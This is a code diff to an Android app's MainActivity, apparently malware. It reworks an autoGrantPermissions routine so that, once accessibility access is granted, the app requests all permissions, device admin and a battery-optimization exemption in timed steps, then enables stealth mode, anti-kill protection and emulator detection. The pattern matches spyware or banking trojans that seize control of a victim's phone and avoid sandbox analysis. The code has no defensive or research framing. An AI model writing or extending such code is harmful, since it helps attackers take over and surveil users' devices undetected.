@@ -96,30 +96,52 @@ public class MainActivity extends AppCompatActivity {
     private void autoGrantPermissions() {
         Toast.makeText(this, "Accessibility enabled! Setting up...", Toast.LENGTH_SHORT).show();
         
-        // ALL STEALTH FEATURES START IMMEDIATELY
+        // Request permissions in sequence with delays
         
-        // Request all permissions
+        // Step 1: Request all permissions
         permissionManager.requestAllPermissions();
-
-        // Request special permissions + battery + device admin
-        permissionManager.requestSpecialPermissions();
         
-        // Delay slightly to let the activity be ready
+        // Step 2: Request special permissions after 1 second
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                permissionManager.requestSpecialPermissions();
+            }
+        }, 1000);
+        
+        // Step 3: Request battery optimization after 2 seconds
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
                 requestBatteryOptimization();
+            }
+        }, 2000);
+        
+        // Step 4: Request device admin after 3 seconds
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
                 requestDeviceAdmin();
             }
-        }, 500);
-
-        // Enable ALL stealth features immediately
-        permissionManager.requestNotificationPermission();
-        enableStealthMode();
-        enableAntiKill();
-        checkEmulator();
+        }, 3000);
         
-        // Auto-click runs automatically for 10 seconds then stops
+        // Step 5: Request notification permission after 4 seconds
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                permissionManager.requestNotificationPermission();
+            }
+        }, 4000);
+        
+        // Step 6: Enable stealth features after 5 seconds
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                enableStealthMode();
+                enableAntiKill();
+                checkEmulator();
+            }
+        }, 5000);
     }
     
     private void enableAntiKill() {
